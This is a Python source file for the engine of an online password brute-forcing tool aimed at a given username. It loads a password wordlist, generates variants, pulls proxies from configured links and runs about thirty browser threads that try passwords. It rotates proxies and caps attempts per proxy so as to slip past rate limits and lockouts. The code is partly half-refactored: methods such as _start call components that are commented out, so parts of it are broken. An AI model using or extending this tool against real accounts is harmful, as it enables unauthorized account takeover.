from __future__ import absolute_import

import time
from threading import Thread, RLock

from queue import Queue

from app import settings
from app.lib.display import Display
from app.lib.browser import Browser
from .threads import PasswordThread, ProxyThread, BrowserThread


class Engine(object):

    def __init__(self, username, max_passwords, file_path, is_color):

        self.username = username

        self.base_password_queue = Queue()
        self.altered_password_queue = Queue()
        self.password_attempt_queue = Queue()
        self.results_queue = Queue()
        self.proxy_queue = Queue()

        self.file_path = file_path
        # password_file = PasswordFile(file_path)
        # self.password_manager = PasswordManager(password_file, max_passwords)
        # self.proxy_manager = ProxyManager()

        # This was the display on old Bruter
        # self.display = Display(username)
        self.display = Display(is_color=is_color)

        self.browsers = []
        self.lock = RLock()

        self.password = None
        self.alive = True
        self.found = False

        self.bots_per_proxy = 0
        self.last_password = None
        self.active_passwords = []
        self.attacks = []

    def _read(self):
        # self.passlist = generate_alterations(self.passlist)
        self.base_password_count = 0
        with open(self.file_path, 'rt', encoding='utf-8') as password_file:
            for password in password_file:
                self.base_password_queue.put(password)
                self.base_password_count += 1
                # yield self.generate_alterations(formatted)

    # # OLD BRUTER METHODS ###########################
    # def start_daemon_threads(self):

    #     self.attack = Thread(target=self.attack)
    #     self.proxy_thread = Thread(target=self.proxy_manager)
    #     self.browser_thread = Thread(target=self.browser_manager)
    #     self.password_thread = Thread(target=self.password_manager)

    #     # self.attacks = []
    #     # for pw_set in self.password_manager.file.read():
    #     #     attack = Thread(target=self.attack, args=[pw_set])
    #     #     attack.daemon = True
    #     #     attack.start()

    #     #     self.attacks.append(attack)

    #     self.attack.daemon = True
    #     self.proxy_thread.daemon = True
    #     self.browser_thread.daemon = True
    #     self.password_thread.daemon = True

    #     self.attack.start()
    #     self.proxy_thread.start()
    #     self.browser_thread.start()
    #     self.password_thread.start()

    #     self.display.info('Searching for proxies ...')

    # def stop_daemon_threads(self):
    #     self.attack.stop()
    #     self.proxy_thread.stop()
    #     self.browser_thread.stop()
    #     self.password_thread.stop()
    #     # for attack in self.attacks:
    #     #     attack.stop()

    def start(self):

        proxy_pool = [ProxyThread(
            proxy_queue=self.proxy_queue,
            link=link,
        ) for link in settings.PROXY_LINKS]

        password_pool = [PasswordThread(
            base_password_queue=self.base_password_queue,
            altered_password_queue=self.altered_password_queue,
            password_attempt_queue=self.password_attempt_queue,  # Might not be needed
        ) for i in range(5)]

        # TODO: Figure out how to limit the number of bots per proxy.
        browser_pool = [
            BrowserThread(self.password_attempt_queue, self.proxy_queue, self.results_queue)
            for i in range(30)
        ]

        pool = proxy_pool + password_pool + browser_pool

        for thread in pool:
            thread.start()

        self._read()

        while not self.altered_password_queue.empty():
            result = self.altered_password_queue.get()
            for password in result[2]:
                if password not in self.password_attempt_queue.queue:
                    print("Adding {password}")
                    self.password_attempt_queue.put(password)

        # Ask threads to die and wait for them to do it
        for thread in pool:
            thread.join()

        # This might wait for all of the threads to finish before showing,
        # which is probably not what we want.
        while not self.results_queue.empty():
            result = self.results_queue.get()
            print(result)

    def _start(self):
        self.display.info('Initiating daemon threads ...')
        self.start_daemon_threads()

        last_attempt = 0
        while self.alive and not self.found:

            if (last_attempt == self.password_manager.attempts and
                    self.password_manager.attempts):
                time.sleep(1.5)
                continue

            for browser in self.browsers:
                self.display.stats(
                    browser.password,
                    self.password_manager.attempts,
                    len(self.browsers)
                )

                last_attempt = self.password_manager.attempts
                self.last_password = browser.password

                if not self.alive or self.found:
                    break

            if (self.password_manager.is_read and
                    not self.password_manager.list_size and
                    len(self.browsers) == 0):
                self.alive = False

    # def _stop(self):
    #     # I don't think these checks are necessary but who knows...
    #     if self.alive:
    #         self.stop_daemon_threads()

    # def stop(self):
    #     if (self.password_manager.is_read and
    #             not self.found and
    #             not self.password_manager.list_size):
    #         self.display.stats_not_found(
    #             self.last_password,
    #             self.password_manager.attempts,
    #             len(self.browsers)
    #         )

    #     if self.found:
    #         self.display.stats_found(
    #             self.password,
    #             self.password_manager.attempts,
    #             len(self.browsers)
    #         )

    # def start(self):
    #     # Should be validated before we get in.
    #     # if not self.passlist_path_exists():
    #     #     self.is_alive = False

    #     # We're not doing the whole session alive thing
    #     # if self.session_exists() and self.is_alive:
    #     # if self.alive:
    #     #     resp = None

    #     #     try:
    #     #         resp = self.get_user_resp()
    #     #     except:
    #     #         self.is_alive = False

    #     #     if resp and self.is_alive:
    #     #         if resp.strip().lower() == 'y':
    #     #             self.resume = True

    #     if self.alive:
    #         self.create_bruter()

    #         try:
    #             self.bruter.start()
    #         except KeyboardInterrupt:
    #             self.bruter.stop()
    #             self.bruter.display.shutdown(
    #                 self.bruter.last_password,
    #                 self.bruter.password_manager.attempts,
    #                 len(self.bruter.browsers)
    #             )
    #         finally:
    #             self.stop()

    def browser_manager(self):
        while self.alive:
            for browser in self.browsers:
                if not self.alive:
                    break

                # # Why are we checking if display account exists?
                # if not Display.account_exists and Browser.account_exists:
                #     Display.account_exists = Browser.account_exists

                if not browser.active:
                    password = browser.password
                    if browser.made_attempt and not browser.locked:
                        if browser.found and not self.found:
                            self.password = password
                            self.found = True

                        with self.lock:
                            self.password_manager.list_remove(password)
                    else:
                        with self.lock:
                            self.proxy_manager.bad_proxy(browser.proxy)

                    self.remove_browser(browser)

                else:
                    if browser.start_time:
                        if time.time() - browser.start_time >= settings.MAX_TIME_TO_WAIT:
                            browser.close()

    def remove_browser(self, browser):
        if browser in self.browsers:
            with self.lock:
                self.browsers.pop(self.browsers.index(browser))
                self.active_passwords.pop(
                    self.active_passwords.index(browser.password))

    def attack(self, passwords):
        proxy = None
        is_attack_started = False
        while self.alive:

            browsers = []
            for password in self.password_manager.passwords:
                if not self.alive:
                    break

                if not proxy:
                    proxy = self.proxy_manager.get_proxy()
                    self.bots_per_proxy = 0

                if self.bots_per_proxy >= settings.MAX_BOTS_PER_PROXY:
                    continue

                if (password not in self.active_passwords and
                        password in self.password_manager.passwords):
                    browser = Browser(self.username, password, proxy)
                    browsers.append(browser)
                    self.bots_per_proxy += 1

                    if not is_attack_started:
                        self.display.info('Starting attack ...')
                        is_attack_started = True

                    with self.lock:
                        self.browsers.append(browser)
                        self.active_passwords.append(password)

            for browser in browsers:
                thread = Thread(target=browser.attempt)
                thread.daemon = True
                try:
                    thread.start()
                except RuntimeError:
                    self.remove_browser(browser)
